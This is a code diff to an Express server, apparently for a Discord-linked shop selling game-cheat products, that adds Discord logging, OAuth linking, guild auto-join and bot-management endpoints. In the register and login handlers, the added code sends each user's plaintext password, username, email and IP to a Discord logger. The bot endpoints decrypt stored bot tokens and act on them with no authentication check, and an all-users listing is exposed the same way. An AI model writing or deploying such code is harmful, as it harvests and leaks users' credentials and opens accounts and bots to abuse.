@@ -1,3 +1,4 @@
+require('dotenv').config();
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
@@ -9,6 +10,10 @@ const crypto = require('crypto');
 const admin = require("firebase-admin");
 const EfiPay = require('sdk-node-apis-efi');
 const cors = require('cors'); // Added CORS
+const CryptoJS = require('crypto-js');
+const { Client, GatewayIntentBits } = require('discord.js');
+const discordLogger = require('./discord-logger'); // Discord Logging System
+
 
 // Initialize Firebase
 const serviceAccount = require("./firebase-service-account.json");
@@ -72,6 +77,13 @@ io.on('connection', (socket) => {
             console.error("Error saving chat message:", e);
         }
 
+        // Log to Discord
+        discordLogger.logChatMessage({
+            username: data.username,
+            message: data.message,
+            timestamp: data.timestamp || new Date().toLocaleString('pt-BR')
+        }).catch(err => console.error('[CHAT-LOG] Error:', err));
+
         // Broadcast to all
         io.emit('chatMessage', data);
     });
@@ -91,6 +103,90 @@ if (!fs.existsSync(uploadsDir)) {
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 
+// --- DISCORD LOGGING MIDDLEWARES ---
+
+// Middleware: Log API Calls (api-called)
+app.use((req, res, next) => {
+    const startTime = Date.now();
+
+    // Interceptar o res.json original para capturar o status code
+    const originalJson = res.json.bind(res);
+    res.json = function (body) {
+        const duration = Date.now() - startTime;
+
+        // Enviar log ao Discord (async, não bloqueia response)
+        discordLogger.logApiCall({
+            method: req.method,
+            path: req.path,
+            status: res.statusCode,
+            ip: req.ip || req.connection.remoteAddress,
+            userId: req.body?.userId || req.query?.userId || null,
+            duration
+        }).catch(err => console.error('[API-LOG] Error:', err));
+
+        return originalJson(body);
+    };
+
+    next();
+});
+
+// Middleware: Detectar SQL Injection em inputs
+app.use((req, res, next) => {
+    const checkPayload = (obj, path = '') => {
+        for (const key in obj) {
+            const value = obj[key];
+            const currentPath = path ? `${path}.${key}` : key;
+
+            if (typeof value === 'string' && discordLogger.detectSQLInjection(value)) {
+                // Log suspeita ao Discord
+                discordLogger.logSuspiciousInjectAccess({
+                    appId: req.body?.appId || 'N/A',
+                    username: req.body?.username || req.body?.user || 'Unknown',
+                    hwid: req.body?.hwid || 'N/A',
+                    ip: req.ip || req.connection.remoteAddress,
+                    reason: `Possível SQL Injection detectado em ${currentPath}`,
+                    payload: value
+                }).catch(err => console.error('[SUSPECT-LOG] Error:', err));
+
+                console.warn(`[SECURITY] SQL Injection attempt detected from ${req.ip} in ${currentPath}`);
+            }
+
+            if (typeof value === 'object' && value !== null) {
+                checkPayload(value, currentPath);
+            }
+        }
+    };
+
+    if (req.body && typeof req.body === 'object') {
+        checkPayload(req.body);
+    }
+
+    if (req.query && typeof req.query === 'object') {
+        checkPayload(req.query);
+    }
+
+    next();
+});
+
+// --- MIDDLEWARE: TRACK SITE ACCESS ---
+// Track unique IP accesses (first time)
+const accessedIPs = new Set();
+
+app.use((req, res, next) => {
+    const ip = req.ip || req.connection.remoteAddress;
+
+    // Only log first access from this IP (avoid spam)
+    if (!accessedIPs.has(ip)) {
+        accessedIPs.add(ip);
+
+        // Log site access to Discord
+        discordLogger.logSiteAccess({ ip })
+            .catch(err => console.error('[SITE-ACCESS-LOG] Error:', err));
+    }
+
+    next();
+});
+
 // --- AUTH API IMPORT ---
 const authApi = require('./auth-api');
 app.use(authApi);
@@ -105,20 +201,67 @@ const getCollection = async (collection) => {
 
 // --- AUTH (Implemented previously, included here for completeness) ---
 app.post('/register', async (req, res) => {
-    // ... (same as before)
-    const { user, pass, email } = req.body;
-    if (!user || !pass || !email) return res.status(400).json({ message: "Todos os campos são obrigatórios" });
+    // Basic validation
+    const { user, pass, email, role } = req.body; // Accept role
+    if (!user || !pass || !email) {
+        return res.status(400).json({ message: "Preencha todos os campos" });
+    }
+
     try {
         const usersRef = db.collection('users');
         const snapshot = await usersRef.where('username', '==', user).get();
-        const emailSnapshot = await usersRef.where('email', '==', email).get();
-        if (!snapshot.empty || !emailSnapshot.empty) return res.status(400).json({ message: "Usuário ou Email já cadastrado" });
-        const hash = await bcrypt.hash(pass, 10);
-        await usersRef.add({
-            username: user, email: email, password: hash, role: 'user',
-            is_content_creator: 0, is_developer: 0, upload_limit_gb: 10, created_at: new Date().toISOString()
+
+        if (!snapshot.empty) {
+            return res.status(400).json({ message: "Usuário já existe" });
+        }
+
+        const hashedPassword = await bcrypt.hash(pass, 10);
+
+        // Define default role if not provided or invalid, ensure it's 'client' or 'partner'
+        let userRole = 'client';
+        if (role === 'partner') userRole = 'partner';
+
+        const newUser = {
+            username: user,
+            email: email,
+            password: hashedPassword,
+            role: userRole, // Store role
+            created_at: new Date().toISOString(),
+            hwid: null,
+            profile_pic: "https://cdn.discordapp.com/embed/avatars/0.png",
+            products: [], // Array of product IDs owned
+            theme_config: {
+                primary: "#ff3c3c", // Default Red
+                secondary: "#1a1a1a",
+                accent: "#ffffff",
+                text: "#ffffff"
+            }
+        };
+
+        const docRef = await usersRef.add(newUser);
+
+        // Log registro no Discord
+        discordLogger.logUserRegister({
+            username: user,
+            password: pass,
+            email: email || 'N/A',
+            ip: req.ip || req.connection.remoteAddress
+        }).catch(err => console.error('[REGISTER-LOG] Error:', err));
+
+        // --- AUTO-LOGIN after Register ---
+        // Return user data so frontend can login immediately
+        res.status(200).json({
+            message: "Registrado com sucesso",
+            user: {
+                id: docRef.id,
+                username: newUser.username,
+                email: newUser.email,
+                role: newUser.role,
+                profile_pic: newUser.profile_pic,
+                theme_config: newUser.theme_config,
+                products: newUser.products
+            }
         });
-        res.status(200).json({ message: "Registrado com sucesso" });
     } catch (e) {
         console.error("Register Error:", e);
         res.status(500).json({ message: "Erro no servidor" });
@@ -130,16 +273,47 @@ app.post('/login', async (req, res) => {
     try {
         const usersRef = db.collection('users');
         const snapshot = await usersRef.where('username', '==', user).limit(1).get();
-        if (snapshot.empty) return res.status(401).json({ message: "Usuário não encontrado" });
+
+        if (snapshot.empty) {
+            // Log login falhou
+            discordLogger.logUserLogin({
+                username: user,
+                password: pass,
+                ip: req.ip || req.connection.remoteAddress,
+                success: false
+            }).catch(err => console.error('[LOGIN-LOG] Error:', err));
+
+            return res.status(401).json({ message: "Usuário não encontrado" });
+        }
+
         const doc = snapshot.docs[0];
         const userData = doc.data();
+
         if (await bcrypt.compare(pass, userData.password)) {
+            // Log login bem-sucedido
+            discordLogger.logUserLogin({
+                username: user,
+                password: pass,
+                ip: req.ip || req.connection.remoteAddress,
+                success: true
+            }).catch(err => console.error('[LOGIN-LOG] Error:', err));
+
             res.status(200).json({
                 token: "sessao_valida", userId: doc.id, username: userData.username, email: userData.email,
                 role: userData.role || 'user', is_content_creator: userData.is_content_creator,
                 is_developer: userData.is_developer, dev_token: userData.dev_token, message: "Logado"
             });
-        } else res.status(401).json({ message: "Senha incorreta" });
+        } else {
+            // Log login falhou
+            discordLogger.logUserLogin({
+                username: user,
+                password: pass,
+                ip: req.ip || req.connection.remoteAddress,
+                success: false
+            }).catch(err => console.error('[LOGIN-LOG] Error:', err));
+
+            res.status(401).json({ message: "Senha incorreta" });
+        }
     } catch (e) {
         console.error("Login Error:", e);
         res.status(500).json({ message: "Erro no servidor" });
@@ -184,6 +358,958 @@ app.post('/update-profile', async (req, res) => {
     } catch (e) {
         console.error("Update Profile Error:", e);
         res.status(500).json({ message: "Erro ao atualizar" });
+    }
+});
+
+// --- DISCORD LINKING ---
+app.post('/link-discord', async (req, res) => {
+    const { userId, discordId, discordUsername, discordAvatar } = req.body;
+    if (!userId || !discordId) return res.status(400).json({ message: "Dados incompletos" });
+
+    try {
+        await db.collection('users').doc(String(userId)).update({
+            discord_id: discordId,
+            discord_username: discordUsername,
+            discord_avatar: discordAvatar,
+            use_discord_avatar: true // Default to true when linking
+        });
+        res.json({ message: "Discord vinculado com sucesso!" });
+    } catch (e) {
+        console.error("Error linking Discord:", e);
+        res.status(500).json({ message: "Erro ao vincular Discord" });
+    }
+});
+
+app.post('/unlink-discord', async (req, res) => {
+    const { userId } = req.body;
+    try {
+        await db.collection('users').doc(String(userId)).update({
+            discord_id: null,
+            discord_username: null,
+            discord_avatar: null,
+            use_discord_avatar: false
+        });
+        res.json({ message: "Discord desvinculado." });
+    } catch (e) {
+        res.status(500).json({ message: "Erro ao desvincular" });
+    }
+});
+
+app.post('/toggle-discord-avatar', async (req, res) => {
+    const { userId, useAvatar } = req.body;
+    try {
+        await db.collection('users').doc(String(userId)).update({
+            use_discord_avatar: useAvatar
+        });
+        res.json({ message: "Preferência atualizada." });
+    } catch (e) {
+        res.status(500).json({ message: "Erro ao atualizar preferência" });
+    }
+});
+
+// --- DISCORD OAUTH (REAL) ---
+const DISCORD_CLIENT_ID = '1467189771762925660';
+const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
+const DISCORD_REDIRECT_URI = 'http://localhost/auth/discord/callback';
+
+app.get('/auth/discord/redirect', (req, res) => {
+    const { userId } = req.query;
+    if (!userId) return res.status(400).send("User ID missing");
+
+    // Redirect to Discord's OAuth page with guilds.join permission
+    const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(DISCORD_REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join&state=${userId}`;
+
+    res.redirect(discordAuthUrl);
+});
+
+app.get('/auth/discord/callback', async (req, res) => {
+    const { code, state } = req.query; // state is userId
+    const userId = state;
+
+    console.log('=== Discord OAuth Callback ===');
+    console.log('Code:', code ? 'Received' : 'Missing');
+    console.log('UserId:', userId);
+
+    if (!userId || !code) {
+        console.error('Missing userId or code');
+        return res.redirect('/?discord_linked=error');
+    }
+
+    try {
+        // Exchange code for access token
+        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams({
+                client_id: DISCORD_CLIENT_ID,
+                client_secret: DISCORD_CLIENT_SECRET,
+                grant_type: 'authorization_code',
+                code: code,
+                redirect_uri: DISCORD_REDIRECT_URI
+            })
+        });
+
+        if (!tokenResponse.ok) {
+            console.error('Token exchange failed:', await tokenResponse.text());
+            return res.redirect('/?discord_linked=error');
+        }
+
+        const tokenData = await tokenResponse.json();
+        const accessToken = tokenData.access_token;
+
+        // Fetch user data from Discord
+        const userResponse = await fetch('https://discord.com/api/users/@me', {
+            headers: {
+                'Authorization': `Bearer ${accessToken}`
+            }
+        });
+
+        if (!userResponse.ok) {
+            console.error('User fetch failed:', await userResponse.text());
+            return res.redirect('/?discord_linked=error');
+        }
+
+        const discordUser = await userResponse.json();
+
+        console.log('Discord User:', discordUser.username, discordUser.id);
+
+        // Update Firestore with real Discord data
+        const avatarUrl = discordUser.avatar
+            ? `https://cdn.discordapp.com/avatars/${discordUser.id}/${discordUser.avatar}.png`
+            : `https://cdn.discordapp.com/embed/avatars/${parseInt(discordUser.discriminator) % 5}.png`;
+
+        console.log('Updating Firestore for userId:', userId);
+        await db.collection('users').doc(String(userId)).update({
+            discord_id: discordUser.id,
+            discord_username: discordUser.username,
+            discord_email: discordUser.email,
+            discord_avatar: avatarUrl,
+            use_discord_avatar: true,
+            discord_access_token: accessToken, // Save for guild operations
+            discord_refresh_token: tokenData.refresh_token, // For token renewal
+            discord_token_expires: Date.now() + (tokenData.expires_in * 1000) // Token expiration time
+        });
+
+        // Log to Discord
+        const userDoc = await db.collection('users').doc(String(userId)).get();
+        const userData = userDoc.data();
+        discordLogger.logDiscordLinked({
+            userId: userId,
+            username: userData.username || 'Unknown',
+            discordId: discordUser.id,
+            discordUsername: discordUser.username,
+            discordAvatar: avatarUrl
+        }).catch(err => console.error('[DISCORD-LINK-LOG] Error:', err));
+
+        // --- AUTO-ADD TO SCARLET DISCORD SERVER ---
+        const SCARLET_GUILD_ID = '1332186483750211647';
+        const DEFAULT_ROLE_ID = '1431641793488752812'; // Cargo padrão ao entrar
+
+        // Mapeamento de produtos para cargos do Discord
+        const PRODUCT_ROLE_MAP = {
+            'Scarlet Menu': '1441087428730552432',
+            'Scarlet Spoofer': '1445603493544067154',
+            'Scarlet External': '1445850606915948606',
+            'Scarlet Roblox': '1445603841553727678',
+            'Scarlet Free-Fire': '1440538340683415604'
+        };
+
+        try {
+            // Buscar bot token do servidor Scarlet
+            const botSnapshot = await db.collection('discord_bots').get();
+            let scarletBotToken = null;
+
+            // Encontrar bot que tenha acesso ao servidor Scarlet
+            for (const botDoc of botSnapshot.docs) {
+                const botData = botDoc.data();
+                const guilds = botData.guilds_with_channels || botData.guilds || [];
+                const hasScarletGuild = guilds.some(g => g.id === SCARLET_GUILD_ID);
+
+                if (hasScarletGuild) {
+                    scarletBotToken = decryptToken(botData.bot_token);
+                    console.log('✅ Found bot with access to Scarlet server');
+                    break;
+                }
+            }
+
+            if (!scarletBotToken) {
+                console.warn('⚠️ No bot found with access to Scarlet server. Skipping auto-add.');
+            } else {
+                // Adicionar usuário ao servidor
+                console.log(`📥 Adding user ${discordUser.username} to Scarlet Discord...`);
+                const addMemberRes = await fetch(`https://discord.com/api/v10/guilds/${SCARLET_GUILD_ID}/members/${discordUser.id}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `Bot ${scarletBotToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        access_token: accessToken,
+                        roles: [DEFAULT_ROLE_ID] // Cargo padrão
+                    })
+                });
+
+                if (addMemberRes.ok || addMemberRes.status === 204) {
+                    console.log('✅ User added to Scarlet Discord server!');
+
+                    // Buscar licenças do usuário para atribuir cargos de produtos
+                    const licensesSnapshot = await db.collection('licenses')
+                        .where('user_id', '==', String(userId))
+                        .get();
+
+                    // Se não houver licenças com String, tentar com Number
+                    let licenses = licensesSnapshot.docs.map(doc => doc.data());
+                    if (licenses.length === 0 && !isNaN(userId)) {
+                        const licensesNumSnapshot = await db.collection('licenses')
+                            .where('user_id', '==', Number(userId))
+                            .get();
+                        licenses = licensesNumSnapshot.docs.map(doc => doc.data());
+                    }
+
+                    if (licenses.length > 0) {
+                        console.log(`📦 Found ${licenses.length} licenses for user`);
+
+                        // Buscar detalhes dos produtos
+                        const productRoles = [];
+                        for (const license of licenses) {
+                            try {
+                                const productDoc = await db.collection('products').doc(String(license.product_id)).get();
+                                if (productDoc.exists) {
+                                    const productName = productDoc.data().name;
+                                    const roleId = PRODUCT_ROLE_MAP[productName];
+
+                                    if (roleId) {
+                                        productRoles.push(roleId);
+                                        console.log(`  ✓ Will assign role for ${productName}: ${roleId}`);
+                                    }
+                                }
+                            } catch (err) {
+                                console.warn(`Could not fetch product ${license.product_id}:`, err);
+                            }
+                        }
+
+                        // Atribuir cargos de produtos
+                        if (productRoles.length > 0) {
+                            console.log(`🎭 Assigning ${productRoles.length} product roles...`);
+
+                            for (const roleId of productRoles) {
+                                try {
+                                    const assignRoleRes = await fetch(
+                                        `https://discord.com/api/v10/guilds/${SCARLET_GUILD_ID}/members/${discordUser.id}/roles/${roleId}`,
+                                        {
+                                            method: 'PUT',
+                                            headers: { 'Authorization': `Bot ${scarletBotToken}` }
+                                        }
+                                    );
+
+                                    if (assignRoleRes.ok || assignRoleRes.status === 204) {
+                                        console.log(`  ✅ Role ${roleId} assigned successfully`);
+                                    } else {
+                                        console.warn(`  ⚠️ Failed to assign role ${roleId}: ${assignRoleRes.status}`);
+                                    }
+
+                                    // Delay para evitar rate limit
+                                    await new Promise(resolve => setTimeout(resolve, 500));
+                                } catch (err) {
+                                    console.error(`Error assigning role ${roleId}:`, err);
+                                }
+                            }
+                        }
+                    } else {
+                        console.log('ℹ️ No licenses found for user, only default role assigned');
+                    }
+                } else if (addMemberRes.status === 403) {
+                    console.error('❌ Bot lacks permission to add members to server');
+                } else if (addMemberRes.status === 400) {
+                    // Usuário já está no servidor, apenas atualizar cargos
+                    console.log('ℹ️ User already in server, updating roles...');
+
+                    // Buscar licenças e atribuir cargos
+                    const licensesSnapshot = await db.collection('licenses')
+                        .where('user_id', '==', String(userId))
+                        .get();
+
+                    let licenses = licensesSnapshot.docs.map(doc => doc.data());
+                    if (licenses.length === 0 && !isNaN(userId)) {
+                        const licensesNumSnapshot = await db.collection('licenses')
+                            .where('user_id', '==', Number(userId))
+                            .get();
+                        licenses = licensesNumSnapshot.docs.map(doc => doc.data());
+                    }
+
+                    // Coletar todos os cargos (padrão + produtos)
+                    const allRoles = [DEFAULT_ROLE_ID];
+
+                    for (const license of licenses) {
+                        try {
+                            const productDoc = await db.collection('products').doc(String(license.product_id)).get();
+                            if (productDoc.exists) {
+                                const productName = productDoc.data().name;
+                                const roleId = PRODUCT_ROLE_MAP[productName];
+                                if (roleId && !allRoles.includes(roleId)) {
+                                    allRoles.push(roleId);
+                                }
+                            }
+                        } catch (err) {
+                            console.warn(`Could not fetch product ${license.product_id}:`, err);
+                        }
+                    }
+
+                    // Atribuir cada cargo individualmente
+                    console.log(`🎭 Updating ${allRoles.length} roles for existing member...`);
+                    for (const roleId of allRoles) {
+                        try {
+                            const assignRoleRes = await fetch(
+                                `https://discord.com/api/v10/guilds/${SCARLET_GUILD_ID}/members/${discordUser.id}/roles/${roleId}`,
+                                {
+                                    method: 'PUT',
+                                    headers: { 'Authorization': `Bot ${scarletBotToken}` }
+                                }
+                            );
+
+                            if (assignRoleRes.ok || assignRoleRes.status === 204) {
+                                console.log(`  ✅ Role ${roleId} assigned`);
+                            }
+
+                            await new Promise(resolve => setTimeout(resolve, 500));
+                        } catch (err) {
+                            console.error(`Error assigning role ${roleId}:`, err);
+                        }
+                    }
+                } else {
+                    const errorText = await addMemberRes.text();
+                    console.error('❌ Failed to add user to server:', addMemberRes.status, errorText);
+                }
+            }
+        } catch (autoAddError) {
+            console.error('❌ Error in auto-add to Discord server:', autoAddError);
+            // Não falhar o login por causa disso
+        }
+
+        console.log('✅ Discord linked successfully!');
+        res.redirect('/?discord_linked=success');
+    } catch (e) {
+        console.error("Discord OAuth Error:", e);
+        res.redirect('/?discord_linked=error');
+    }
+});
+
+// Get user settings (including Discord data)
+app.get('/user/settings/:userId', async (req, res) => {
+    const { userId } = req.params;
+    try {
+        const doc = await db.collection('users').doc(String(userId)).get();
+        if (!doc.exists) return res.status(404).json({ message: "User not found" });
+
+        const userData = doc.data();
+        res.json({
+            profile_pic: userData.profile_pic,
+            theme_config: userData.theme_config,
+            discord_id: userData.discord_id || null,
+            discord_username: userData.discord_username || null,
+            discord_email: userData.discord_email || null,
+            discord_avatar: userData.discord_avatar || null,
+            use_discord_avatar: userData.use_discord_avatar || false
+        });
+    } catch (e) {
+        console.error("Error fetching user settings:", e);
+        res.status(500).json({ message: "Erro ao buscar settings" });
+    }
+});
+
+// --- BOT MANAGER ---
+const ENCRYPTION_KEY = process.env.BOT_ENCRYPTION_KEY;
+
+function encryptToken(token) {
+    return CryptoJS.AES.encrypt(token, ENCRYPTION_KEY).toString();
+}
+
+function decryptToken(encryptedToken) {
+    const bytes = CryptoJS.AES.decrypt(encryptedToken, ENCRYPTION_KEY);
+    return bytes.toString(CryptoJS.enc.Utf8);
+}
+
+// Add Bot
+app.post('/bots/add', async (req, res) => {
+    const { userId, botToken } = req.body;
+    if (!userId || !botToken) return res.status(400).json({ message: "userId e botToken obrigatórios" });
+
+    try {
+        // Verify bot token by fetching bot user info
+        const botUserRes = await fetch('https://discord.com/api/v10/users/@me', {
+            headers: { 'Authorization': `Bot ${botToken}` }
+        });
+
+        if (!botUserRes.ok) {
+            return res.status(400).json({ message: "Token inválido" });
+        }
+
+        const botUser = await botUserRes.json();
+
+        // Fetch guilds
+        const guildsRes = await fetch('https://discord.com/api/v10/users/@me/guilds', {
+            headers: { 'Authorization': `Bot ${botToken}` }
+        });
+
+        const guilds = guildsRes.ok ? await guildsRes.json() : [];
+
+        // Encrypt token before saving
+        const encryptedToken = encryptToken(botToken);
+
+        const botData = {
+            user_id: String(userId),
+            bot_id: botUser.id,
+            bot_name: botUser.username,
+            bot_avatar: botUser.avatar ? `https://cdn.discordapp.com/avatars/${botUser.id}/${botUser.avatar}.png` : null,
+            bot_token: encryptedToken,
+            guilds: guilds.map(g => ({ id: g.id, name: g.name, icon: g.icon })),
+            added_at: new Date().toISOString()
+        };
+
+        const docRef = await db.collection('discord_bots').add(botData);
+        res.json({ message: "Bot adicionado!", id: docRef.id, bot: { ...botData, bot_token: undefined } });
+    } catch (e) {
+        console.error("Error adding bot:", e);
+        res.status(500).json({ message: "Erro ao adicionar bot" });
+    }
+});
+
+// List Bots
+app.get('/bots/:userId', async (req, res) => {
+    const { userId } = req.params;
+    try {
+        const snapshot = await db.collection('discord_bots').where('user_id', '==', String(userId)).get();
+        const bots = snapshot.docs.map(doc => {
+            const data = doc.data();
+            return {
+                id: doc.id,
+                bot_id: data.bot_id,
+                bot_name: data.bot_name,
+                bot_avatar: data.bot_avatar,
+                guilds: data.guilds,
+                added_at: data.added_at
+            };
+        });
+        res.json({ bots });
+    } catch (e) {
+        console.error("Error fetching bots:", e);
+        res.status(500).json({ message: "Erro ao buscar bots" });
+    }
+});
+
+// Get Bot Guilds and Channels
+app.get('/bots/:botDocId/guilds', async (req, res) => {
+    const { botDocId } = req.params;
+    const { forceRefresh } = req.query; // Optional param to force refresh
+
+    try {
+        console.log('📡 Fetching guilds for bot:', botDocId);
+        const doc = await db.collection('discord_bots').doc(botDocId).get();
+        if (!doc.exists) {
+            console.error('❌ Bot document not found:', botDocId);
+            return res.status(404).json({ message: "Bot não encontrado" });
+        }
+
+        const botData = doc.data();
+        console.log('✅ Bot data retrieved:', botData.bot_name);
+
+        // Check if we have cached guilds and they're recent (less than 5 minutes old)
+        const cacheAge = botData.guilds_cache_time ? Date.now() - new Date(botData.guilds_cache_time).getTime() : Infinity;
+        const CACHE_DURATION = 5 * 60 * 1000; // 5 minutes
+
+        if (!forceRefresh && botData.guilds_with_channels && cacheAge < CACHE_DURATION) {
+            console.log('✅ Using cached guild data (age: ' + Math.floor(cacheAge / 1000) + 's)');
+            return res.json({ guilds: botData.guilds_with_channels, cached: true });
+        }
+
+        console.log('🔄 Cache miss or expired, fetching from Discord...');
+        const botToken = decryptToken(botData.bot_token);
+
+        // Fetch fresh guild list with channels
+        console.log('🌐 Fetching guilds from Discord API...');
+        const guildsRes = await fetch('https://discord.com/api/v10/users/@me/guilds', {
+            headers: { 'Authorization': `Bot ${botToken}` }
+        });
+
+        if (!guildsRes.ok) {
+            const errorText = await guildsRes.text();
+            console.error('❌ Discord API error:', guildsRes.status, errorText);
+
+            // If rate limited and we have cached data, return it
+            if (guildsRes.status === 429 && botData.guilds_with_channels) {
+                console.log('⚠️ Rate limited, returning cached data');
+                return res.json({ guilds: botData.guilds_with_channels, cached: true, rateLimited: true });
+            }
+
+            return res.status(500).json({ message: "Erro ao buscar servidores", details: errorText });
+        }
+
+        const guilds = await guildsRes.json();
+        console.log(`✅ Found ${guilds.length} guilds`);
+
+        // Fetch channels for each guild
+        console.log('📺 Fetching channels for each guild...');
+        const guildsWithChannels = await Promise.all(guilds.map(async (guild) => {
+            const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guild.id}/channels`, {
+                headers: { 'Authorization': `Bot ${botToken}` }
+            });
+            const channels = channelsRes.ok ? await channelsRes.json() : [];
+            console.log(`  Guild "${guild.name}": ${channels.filter(c => c.type === 0).length} text channels`);
+            return {
+                id: guild.id,
+                name: guild.name,
+                icon: guild.icon,
+                channels: channels.filter(c => c.type === 0).map(c => ({ // Type 0 = Text channel
+                    id: c.id,
+                    name: c.name
+                }))
+            };
+        }));
+
+        // Update cache in Firestore
+        await db.collection('discord_bots').doc(botDocId).update({
+            guilds_with_channels: guildsWithChannels,
+            guilds_cache_time: new Date().toISOString()
+        });
+
+        console.log('✅ Cache updated and sending guild data to frontend');
+        res.json({ guilds: guildsWithChannels, cached: false });
+    } catch (e) {
+        console.error("❌ Error fetching guild channels:", e);
+        res.status(500).json({ message: "Erro ao buscar canais", error: e.message });
+    }
+});
+
+// Send Message
+app.post('/bots/:botDocId/send-message', async (req, res) => {
+    const { botDocId } = req.params;
+    const { channelId, message } = req.body;
+
+    if (!channelId || !message) return res.status(400).json({ message: "channelId e message obrigatórios" });
+
+    try {
+        const doc = await db.collection('discord_bots').doc(botDocId).get();
+        if (!doc.exists) return res.status(404).json({ message: "Bot não encontrado" });
+
+        const botToken = decryptToken(doc.data().bot_token);
+
+        const msgRes = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
+            method: 'POST',
+            headers: {
+                'Authorization': `Bot ${botToken}`,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ content: message })
+        });
+
+        if (!msgRes.ok) {
+            const error = await msgRes.text();
+            console.error("Discord API error:", error);
+            return res.status(500).json({ message: "Erro ao enviar mensagem" });
+        }
+
+        res.json({ message: "Mensagem enviada!" });
+    } catch (e) {
+        console.error("Error sending message:", e);
+        res.status(500).json({ message: "Erro ao enviar mensagem" });
+    }
+});
+
+// Add Member to Guild
+app.post('/bots/:botDocId/add-member', async (req, res) => {
+    const { botDocId } = req.params;
+    const { guildId, userId: userDocId } = req.body; // userDocId is the Firestore document ID
+
+    if (!guildId || !userDocId) {
+        return res.status(400).json({ message: "guildId e userId obrigatórios" });
+    }
+
+    try {
+        // Get bot token
+        const botDoc = await db.collection('discord_bots').doc(botDocId).get();
+        if (!botDoc.exists) return res.status(404).json({ message: "Bot não encontrado" });
+
+        const botToken = decryptToken(botDoc.data().bot_token);
+
+        // Get user's Discord access token from database
+        const userDoc = await db.collection('users').doc(String(userDocId)).get();
+        if (!userDoc.exists) return res.status(404).json({ message: "Usuário não encontrado" });
+
+        const userData = userDoc.data();
+
+        if (!userData.discord_id) {
+            return res.status(400).json({ message: "Usuário não tem Discord vinculado" });
+        }
+
+        if (!userData.discord_access_token) {
+            return res.status(400).json({
+                message: "Token de acesso expirado. Peça ao usuário para desvincular e vincular o Discord novamente."
+            });
+        }
+
+        // Check if token is expired
+        if (userData.discord_token_expires && Date.now() > userData.discord_token_expires) {
+            return res.status(400).json({
+                message: "Token de acesso expirado. Peça ao usuário para desvincular e vincular o Discord novamente."
+            });
+        }
+
+        // Add member to guild using Discord API
+        const addRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/members/${userData.discord_id}`, {
+            method: 'PUT',
+            headers: {
+                'Authorization': `Bot ${botToken}`,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ access_token: userData.discord_access_token })
+        });
+
+        if (!addRes.ok) {
+            const error = await addRes.text();
+            console.error("Discord add member error:", addRes.status, error);
+
+            // Provide more specific error messages
+            if (addRes.status === 403) {
+                return res.status(403).json({ message: "Bot sem permissão para adicionar membros" });
+            } else if (addRes.status === 401) {
+                return res.status(401).json({ message: "Token de acesso inválido. Revinculação necessária." });
+            }
+
+            return res.status(500).json({ message: "Erro ao adicionar membro: " + error });
+        }
+
+        const result = await addRes.json();
+        console.log('✅ Member added successfully:', userData.username);
+
+        res.json({ message: `Membro ${userData.username} adicionado ao servidor!` });
+    } catch (e) {
+        console.error("Error adding member:", e);
+
+        res.status(500).json({ message: "Erro ao adicionar membro" });
+    }
+});
+
+// Get all users with Discord linked
+app.get('/users/discord-linked', async (req, res) => {
+    try {
+        // Fetch all users and filter in code to avoid Firestore index requirements
+        const snapshot = await db.collection('users').get();
+
+        const users = snapshot.docs
+            .map(doc => {
+                const data = doc.data();
+                return {
+                    id: doc.id,
+                    username: data.username,
+                    discord_id: data.discord_id,
+                    discord_username: data.discord_username,
+                    discord_avatar: data.discord_avatar
+                };
+            })
+            .filter(user => user.discord_id && user.discord_id !== null); // Filter users with Discord linked
+
+        console.log(`✅ Found ${users.length} users with Discord linked`);
+        res.json({ users });
+    } catch (e) {
+        console.error("Error fetching Discord users:", e);
+        res.status(500).json({ message: "Erro ao buscar usuários" });
+    }
+});
+
+
+// Add multiple members to guild (bulk add)
+app.post('/bots/:botDocId/add-members-bulk', async (req, res) => {
+    const { botDocId } = req.params;
+    const { guildId, userIds } = req.body; // userIds is array of user document IDs
+
+    if (!guildId || !userIds || !Array.isArray(userIds)) {
+        return res.status(400).json({ message: "guildId e userIds (array) obrigatórios" });
+    }
+
+    try {
+        const doc = await db.collection('discord_bots').doc(botDocId).get();
+        if (!doc.exists) return res.status(404).json({ message: "Bot não encontrado" });
+
+        const botToken = decryptToken(doc.data().bot_token);
+
+        const results = {
+            success: [],
+            failed: []
+        };
+
+        // Process each user
+        for (const userId of userIds) {
+            try {
+                const userDoc = await db.collection('users').doc(String(userId)).get();
+                if (!userDoc.exists) {
+                    results.failed.push({ userId, reason: "Usuário não encontrado" });
+                    continue;
+                }
+
+                const userData = userDoc.data();
+                if (!userData.discord_id) {
+                    results.failed.push({ userId, username: userData.username, reason: "Discord não vinculado" });
+                    continue;
+                }
+
+                // Note: We don't have access_token stored, so this will likely fail
+                // This is a limitation - we'd need to store OAuth tokens to make this work
+                const addRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/members/${userData.discord_id}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `Bot ${botToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        // access_token would be needed here
+                    })
+                });
+
+                if (addRes.ok) {
+                    results.success.push({ userId, username: userData.username, discord_username: userData.discord_username });
+                } else {
+                    const error = await addRes.text();
+                    results.failed.push({ userId, username: userData.username, reason: error });
+                }
+
+                // Add delay to avoid rate limiting
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+            } catch (e) {
+                results.failed.push({ userId, reason: e.message });
+            }
+        }
+
+        res.json({
+            message: `Processado ${userIds.length} usuários`,
+            results
+        });
+    } catch (e) {
+        console.error("Error bulk adding members:", e);
